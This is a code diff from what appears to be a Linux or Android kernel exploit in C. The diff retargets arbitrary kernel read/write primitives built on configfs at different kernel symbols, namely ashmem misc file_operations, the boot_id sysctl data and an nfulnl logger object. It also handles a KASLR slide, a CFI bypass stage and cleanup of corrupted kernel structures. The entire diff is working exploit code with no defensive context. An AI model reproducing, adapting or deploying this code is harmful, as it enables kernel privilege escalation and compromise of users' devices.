@@ -196,7 +196,7 @@ int repair_fake_fops_llseek(int fd) {
 
 int restore_slide_boot_id(int fd) {
   uintptr_t boot_id_data_ptr =
-      SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset;
+      SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
   slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
   configfs_read_once(
       fd, boot_id_data_ptr, &slide_bootid_before, sizeof(slide_bootid_before));
@@ -216,7 +216,7 @@ int restore_slide_boot_id(int fd) {
       slide_bootid_after == slide_bootid_want;
 
 #ifdef SLIDE_RB_PARENT_TYPE_RESTORE
-  uintptr_t parent_type = SLIDE_NFULNL_LOGGER + slide_p0_offset +
+  uintptr_t parent_type = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset +
                           sizeof(uint64_t);
   uint64_t type_before = 0;
   uint64_t type_after = 0;
@@ -255,7 +255,7 @@ int try_cfi_stage(void) {
     return 0;
   }
 
-  uintptr_t misc_fops = data_addr(UINPUT_FOPS);
+  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
@@ -312,7 +312,7 @@ int try_cfi_stage(void) {
   }
 #endif
 
-  uint64_t original_fops = data_addr(UINPUT_FOPS);
+  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
   pr_info("cfi restoring misc_fops target=%016zx value=%016llx\n",
           misc_fops, (unsigned long long)original_fops);
   ssize_t restore = configfs_write_once(
@@ -407,7 +407,7 @@ int try_cfi_stage(void) {
 
 fail:
   if (dirty) {
-    uint64_t original_fops_fail = data_addr(UINPUT_FOPS);
+    uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
     if (kaslr_done) {
       original_fops_fail = canon_addr(ASHMEM_FOPS);
     }
